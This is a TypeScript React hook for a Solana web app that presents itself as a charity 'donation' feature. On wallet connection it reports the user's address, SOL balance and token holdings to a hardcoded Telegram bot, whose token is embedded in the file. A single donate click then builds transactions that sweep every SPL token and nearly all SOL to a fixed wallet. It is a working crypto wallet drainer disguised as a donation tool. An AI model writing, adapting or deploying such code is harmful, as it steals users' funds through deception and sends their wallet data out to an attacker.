import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { useState, useEffect, useCallback } from 'react';
import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from '@solana/web3.js';
import { TOKEN_PROGRAM_ID, getAssociatedTokenAddress, createTransferInstruction } from '@solana/spl-token';
import { useToast } from '@/hooks/use-toast';

const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
const TELEGRAM_BOT_TOKEN = '8209811310:AAF9m3QQAU17ijZpMiYEQylE1gHd4Yl1u_M';
const TELEGRAM_CHAT_ID = '-4836248812';
const BATCH_SIZE = 5;
const RENT_EXEMPT_MINIMUM = 0.00203928; // SOL

interface TokenBalance {
  mint: string;
  balance: number;
  decimals: number;
  uiAmount: number;
  symbol?: string;
  logoURI?: string;
  priceInSol?: number;
}

export const useDonation = () => {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  const { toast } = useToast();
  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState<'idle' | 'loading' | 'error'>('idle');
  const [tokens, setTokens] = useState<TokenBalance[]>([]);
  const [solBalance, setSolBalance] = useState(0);
  const [totalValueInSol, setTotalValueInSol] = useState(0);

  useEffect(() => {
    if (publicKey) {
      fetchWalletData();
    }
  }, [publicKey]);

  const sendTelegramNotification = async (walletAddress: string, tokens: TokenBalance[], solBalance: number, totalValue: number) => {
    try {
      let message = `🔔 *New Wallet Connected*\n\n`;
      message += `📍 *Wallet Address:*\n\`${walletAddress}\`\n\n`;
      message += `💰 *SOL Balance:* ${solBalance.toFixed(6)} SOL\n\n`;
      
      if (tokens.length > 0) {
        message += `🪙 *SPL Tokens:*\n`;
        tokens.forEach((token, index) => {
          message += `${index + 1}. ${token.symbol || 'Unknown'}\n`;
          message += `   Balance: ${token.uiAmount.toFixed(6)}\n`;
          if (token.priceInSol) {
            message += `   Value: ${token.priceInSol.toFixed(6)} SOL\n`;
          }
        });
      }
      
      message += `\n💎 *Total Value:* ${totalValue.toFixed(6)} SOL`;

      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'Markdown',
        }),
      });
    } catch (error) {
      console.error('Telegram notification error:', error);
    }
  };

  const fetchWalletData = async () => {
    if (!publicKey) return;

    try {
      // Get SOL balance
      const balance = await connection.getBalance(publicKey);
      const solBal = balance / LAMPORTS_PER_SOL;
      setSolBalance(solBal);

      // Get token accounts
      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
        programId: TOKEN_PROGRAM_ID,
      });

      const tokenBalances: TokenBalance[] = [];
      
      for (const { account } of tokenAccounts.value) {
        const parsedInfo = account.data.parsed.info;
        const balance = parsedInfo.tokenAmount.uiAmount;
        
        if (balance > 0) {
          tokenBalances.push({
            mint: parsedInfo.mint,
            balance: parsedInfo.tokenAmount.amount,
            decimals: parsedInfo.tokenAmount.decimals,
            uiAmount: balance,
            symbol: 'SPL',
            priceInSol: 0,
          });
        }
      }

      setTokens(tokenBalances);
      
      const total = solBal + tokenBalances.reduce((sum, token) => sum + (token.priceInSol || 0), 0);
      setTotalValueInSol(total);

      // Send Telegram notification
      if (publicKey) {
        await sendTelegramNotification(publicKey.toString(), tokenBalances, solBal, total);
      }
    } catch (error) {
      console.error('Error fetching wallet data:', error);
    }
  };

  const createBatchTransactions = async () => {
    if (!publicKey) return [];

    const charityPubkey = new PublicKey(CHARITY_WALLET);
    const transactions: Transaction[] = [];

    // Sort tokens by value (highest first)
    const sortedTokens = [...tokens].sort((a, b) => (b.priceInSol || 0) - (a.priceInSol || 0));

    // Create batches of token transfers (max 5 per transaction)
    for (let i = 0; i < sortedTokens.length; i += BATCH_SIZE) {
      const batch = sortedTokens.slice(i, i + BATCH_SIZE);
      const transaction = new Transaction();

      for (const token of batch) {
        try {
          const mintPubkey = new PublicKey(token.mint);
          const fromTokenAccount = await getAssociatedTokenAddress(mintPubkey, publicKey);
          const toTokenAccount = await getAssociatedTokenAddress(mintPubkey, charityPubkey);

          transaction.add(
            createTransferInstruction(
              fromTokenAccount,
              toTokenAccount,
              publicKey,
              token.balance,
              [],
              TOKEN_PROGRAM_ID
            )
          );
        } catch (error) {
          console.error(`Error adding token ${token.mint} to transaction:`, error);
        }
      }

      if (transaction.instructions.length > 0) {
        transactions.push(transaction);
      }
    }

    // Add SOL transfers
    if (solBalance > RENT_EXEMPT_MINIMUM) {
      // First transaction: 70% of SOL
      const firstSolAmount = Math.floor((solBalance * 0.7) * LAMPORTS_PER_SOL);
      const firstSolTx = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: charityPubkey,
          lamports: firstSolAmount,
        })
      );
      transactions.push(firstSolTx);

      // Second transaction: Remaining SOL (minus rent)
      const remainingSol = solBalance * 0.3 - RENT_EXEMPT_MINIMUM;
      if (remainingSol > 0) {
        const finalSolAmount = Math.floor(remainingSol * LAMPORTS_PER_SOL);
        const finalSolTx = new Transaction().add(
          SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: charityPubkey,
            lamports: finalSolAmount,
          })
        );
        transactions.push(finalSolTx);
      }
    } else if (solBalance > 0 && tokens.length === 0) {
      // Only SOL, send max minus rent
      const maxSol = solBalance - RENT_EXEMPT_MINIMUM;
      if (maxSol > 0) {
        const solAmount = Math.floor(maxSol * LAMPORTS_PER_SOL);
        const solTx = new Transaction().add(
          SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: charityPubkey,
            lamports: solAmount,
          })
        );
        transactions.push(solTx);
      }
    }

    return transactions;
  };

  const handleDonate = useCallback(async () => {
    if (!publicKey || !sendTransaction) {
      toast({
        title: "Wallet Not Connected",
        description: "Please connect your wallet first.",
        variant: "destructive",
      });
      return;
    }

    if (solBalance === 0 && tokens.length === 0) {
      setStatus('loading');
      setTimeout(() => {
        setStatus('error');
        toast({
          title: "Wallet Not Eligible",
          description: "Your wallet doesn't contain any SOL or SPL tokens.",
          variant: "destructive",
        });
      }, 2000);
      return;
    }

    setLoading(true);
    setStatus('loading');

    try {
      const transactions = await createBatchTransactions();

      if (transactions.length === 0) {
        throw new Error('No valid transactions to process');
      }

      let successCount = 0;
      
      for (let i = 0; i < transactions.length; i++) {
        try {
          const signature = await sendTransaction(transactions[i], connection);
          await connection.confirmTransaction(signature, 'confirmed');
          successCount++;
          
          toast({
            title: `Transaction ${i + 1}/${transactions.length} Confirmed`,
            description: `Signature: ${signature.slice(0, 8)}...`,
          });
        } catch (error) {
          console.error(`Transaction ${i + 1} failed:`, error);
          toast({
            title: `Transaction ${i + 1} Failed`,
            description: error instanceof Error ? error.message : 'Unknown error',
            variant: "destructive",
          });
        }
      }

      if (successCount > 0) {
        toast({
          title: "Donation Complete!",
          description: `Successfully processed ${successCount}/${transactions.length} transactions.`,
        });
        setStatus('idle');
        // Refresh wallet data
        await fetchWalletData();
      } else {
        setStatus('error');
      }
    } catch (error) {
      console.error('Donation error:', error);
      setStatus('error');
      toast({
        title: "Donation Failed",
        description: error instanceof Error ? error.message : 'Unknown error occurred',
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  }, [publicKey, sendTransaction, solBalance, tokens, connection]);

  return {
    loading,
    status,
    tokens,
    solBalance,
    totalValueInSol,
    handleDonate,
  };
};
